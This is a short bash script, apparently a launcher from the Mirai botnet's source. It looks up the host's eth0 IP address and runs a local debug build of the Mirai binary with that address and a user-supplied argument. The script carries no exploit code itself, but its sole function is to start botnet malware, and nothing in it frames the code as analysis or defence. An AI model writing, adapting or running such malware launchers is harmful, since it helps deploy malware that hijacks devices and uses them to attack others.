#!/bin/bash

IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
./mirai.dbg $1 $IP $1 0
